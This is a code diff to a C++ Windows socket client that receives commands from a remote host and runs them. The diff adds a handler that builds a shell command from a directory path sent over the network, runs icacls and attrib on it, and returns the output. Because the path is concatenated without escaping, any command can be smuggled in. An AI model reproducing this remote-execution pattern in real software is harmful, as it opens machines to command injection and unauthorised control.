@@ -6,11 +6,12 @@
 #include "Socket.h"
 #include "WindowsSocket.h"
 #include "string.h"
+#include "Aclapi.h""
 using namespace std;
 
 #define DEFAULT_BUFLEN 1050
-#define DEFAULT_PORT "5004"
-#define DEFAULT_HOST "127.0.0.1"
+#define DEFAULT_PORT "5005"
+#define DEFAULT_HOST "192.168.43.49"
 
 std::ofstream openFile(char *file_path)
 {
@@ -84,6 +85,42 @@ void executeCommand(Socket clientSocket, SOCKET socket)
 	{
 		cout << "end execute" << endl;
 	}
+}
+
+void dirInfo(Socket clientSocket, SOCKET socket)
+{
+	//get directory size
+	int iResult, iResult2;
+	char sizeOfPacket[DEFAULT_BUFLEN];
+	memset(sizeOfPacket, 0, DEFAULT_BUFLEN);
+	iResult = clientSocket.receive(socket, sizeOfPacket, DEFAULT_BUFLEN);
+	iResult2 = clientSocket.send_data(socket, "ok");//ok
+
+	//get directory
+	int sizePacket = atoi(sizeOfPacket);
+	char *packet = new char[sizePacket + 1];
+	memset(packet, 0, sizePacket + 1);
+	iResult = clientSocket.receive(socket, packet, sizePacket+1);
+	iResult2 = clientSocket.send_data(socket, "ok");//ok
+
+	//char * command = "cd \"C:\\Users\\admin\\Desktop\\Analysis\" && for /f %x in ('dir /b') do icacls %x";
+	string dir = string(packet);
+	string command = "cd \"" + dir + "\" && for /f %x in ('dir /b /a') do icacls %x && attrib %x";
+	
+	//executes the command
+	std::string w = exec(command.c_str());
+
+	//send size
+	iResult2 = clientSocket.send_data(socket, to_string(w.length()).c_str());
+	char *packetOK = new char[3];
+	memset(packetOK, 0, 3);
+	iResult = clientSocket.receive(socket, packetOK, 3);//ok
+
+	//send result
+	iResult2 = clientSocket.send_data(socket, w.c_str());
+	memset(packetOK, 0, 3);
+	iResult = clientSocket.receive(socket, packetOK, 3);//ok
+	
 }
 
 bool changeIp(Socket & clientSocket, SOCKET & socket)
@@ -165,15 +202,15 @@ bool changeIp(Socket & clientSocket, SOCKET & socket)
 }
 
 
-int main1()
-{
-	char *packet = new char[17];
-	strcpy(packet, "10.20.20.183:4000");
-	char* ip = strtok(packet, ":");
-	char* port = strtok(NULL, ":");
-	cout << "SD";
-	return 0;
-}
+//int main()
+//{
+//	string dir = "c:\\";
+//	string command = "cd \"" + dir + "\" && for /f %x in ('dir /b') do icacls %x";
+//	char * c = "\" && for /f %x in ('dir /b') do icacls %x";
+//	cout << c;
+//
+//	cout << command;
+//}
 int main(int argc, char **argv)
 {
 	Socket clientSocket;
@@ -263,7 +300,7 @@ int main(int argc, char **argv)
 					}
 					else if (!strcmp(recvbuf, "FILE_SYSTEM_INFO"))//2, 6
 					{
-
+						dirInfo(clientSocket, socket);
 					}
 					else
 					{
